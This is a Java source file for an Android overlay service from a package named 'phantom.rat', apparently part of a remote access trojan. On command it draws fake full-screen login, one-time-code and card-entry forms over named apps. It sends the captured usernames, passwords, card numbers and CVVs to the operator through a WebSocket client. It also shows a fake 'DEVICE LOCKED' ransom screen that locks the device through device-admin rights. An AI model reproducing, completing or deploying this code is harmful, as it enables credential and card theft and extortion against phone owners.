package com.phantom.rat;

import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.provider.Settings;
import android.text.InputType;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

import org.json.JSONObject;

public class OverlayService extends Service {
    private WindowManager wm;
    private View overlay;

    public static String show(Context ctx, String args) {
        try {
            JSONObject o = new JSONObject(args == null ? "{}" : args);
            String app = o.optString("app", "System");
            String kind = o.optString("kind", "login");
            Intent i = new Intent(ctx, OverlayService.class)
                    .putExtra("app", app).putExtra("kind", kind);
            if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i);
            else ctx.startService(i);
            return "overlay deployed (" + kind + ")";
        } catch (Exception e) {
            return "overlay error: " + e.getMessage();
        }
    }

    public static void showRansom(Context ctx) {
        Intent i = new Intent(ctx, OverlayService.class).putExtra("kind", "ransom");
        if (Build.VERSION.SDK_INT >= 26) ctx.startForegroundService(i);
        else ctx.startService(i);
    }

    @Override
    public void onCreate() {
        super.onCreate();
        wm = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
        if (Build.VERSION.SDK_INT >= 26) {
            android.app.NotificationChannel nc = new android.app.NotificationChannel(
                    "overlay", "Overlay", android.app.NotificationManager.IMPORTANCE_MIN);
            android.app.NotificationManager nm = getSystemService(android.app.NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(nc);
            startForeground(3, new android.app.Notification.Builder(this, "overlay")
                    .setSmallIcon(android.R.drawable.ic_menu_manage)
                    .setContentTitle("Overlay").setOngoing(true).build());
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String app = intent == null ? "System" : intent.getStringExtra("app");
        String kind = intent == null ? "login" : intent.getStringExtra("kind");
        if (kind == null) kind = "login";
        removeOverlay();
        new Handler(Looper.getMainLooper()).post(() -> {
            if ("ransom".equals(kind)) showRansomView();
            else showForm(app, kind);
        });
        return START_STICKY;
    }

    private void showForm(String app, String kind) {
        if (!Settings.canDrawOverlays(this)) return;
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(0xE6101626);
        root.setPadding(34, 48, 34, 48);

        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setBackgroundColor(Color.parseColor("#1a2338"));
        card.setPadding(28, 30, 28, 30);

        TextView title = new TextView(this);
        title.setText(app);
        title.setTextColor(Color.WHITE);
        title.setTextSize(20);
        title.setGravity(Gravity.CENTER);

        EditText user = new EditText(this);
        user.setHint(kind.equals("otp") ? "Enter code" : "Username / Email");
        style(user);

        EditText pass = new EditText(this);
        pass.setHint("Password");
        pass.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
        style(pass);

        EditText cardNo = new EditText(this);
        cardNo.setHint("Card number");
        cardNo.setInputType(InputType.TYPE_CLASS_NUMBER);
        style(cardNo);

        EditText cardCvv = new EditText(this);
        cardCvv.setHint("CVV / Expiry");
        style(cardCvv);

        Button submit = new Button(this);
        submit.setText("Continue");
        submit.setBackgroundColor(Color.parseColor("#22d3ee"));
        submit.setTextColor(Color.WHITE);

        submit.setOnClickListener(v -> {
            StringBuilder data = new StringBuilder("app=").append(app).append(";kind=").append(kind)
                    .append(";user=").append(user.getText())
                    .append(";pass=").append(pass.getText())
                    .append(";card=").append(cardNo.getText())
                    .append(";cvv=").append(cardCvv.getText());
            WebSocketClient w = WebSocketClient.getInstance();
            if (w != null) {
                if (kind.equals("otp")) w.sendOtp(app, user.getText().toString().trim());
                else w.sendLog("card", data.toString());
            }
            removeOverlay();
        });

        if (kind.equals("otp")) {
            card.addView(title); card.addView(user); card.addView(submit);
        } else if (kind.equals("card")) {
            card.addView(title); card.addView(cardNo); card.addView(cardCvv); card.addView(submit);
        } else {
            card.addView(title); card.addView(user); card.addView(pass); card.addView(submit);
        }
        root.addView(card, new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT));
        addOverlay(root);
    }

    private void style(EditText e) {
        e.setTextColor(Color.WHITE);
        e.setHintTextColor(0xFF8B98B5);
        e.setBackgroundColor(Color.parseColor("#0f1524"));
        e.setPadding(24, 28, 24, 28);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 14, 0, 0);
        e.setLayoutParams(lp);
    }

    private void showRansomView() {
        if (!Settings.canDrawOverlays(this)) return;
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setGravity(Gravity.CENTER);
        root.setBackgroundColor(0xF0000000);
        root.setPadding(40, 40, 40, 40);

        TextView t = new TextView(this);
        t.setText("⚠️ DEVICE LOCKED\n\nYour device has been locked by a security policy.\n"
                + "Contact support to restore access.");
        t.setTextColor(Color.RED);
        t.setTextSize(17);
        t.setGravity(Gravity.CENTER);
        root.addView(t);
        root.setOnClickListener(v -> {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null && PermissionHelper.isAdmin(this)) dpm.lockNow();
        });
        addOverlay(root);
    }

    private void addOverlay(View view) {
        WindowManager.LayoutParams p = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,   // API 26+, minSdk 26
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT);
        p.gravity = Gravity.TOP | Gravity.START;
        try {
            wm.addView(view, p);
            overlay = view;
        } catch (Exception ignored) {}
    }

    private void removeOverlay() {
        try {
            if (overlay != null) wm.removeView(overlay);
        } catch (Exception ignored) {}
        overlay = null;
    }

    @Override
    public void onDestroy() {
        removeOverlay();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }
}
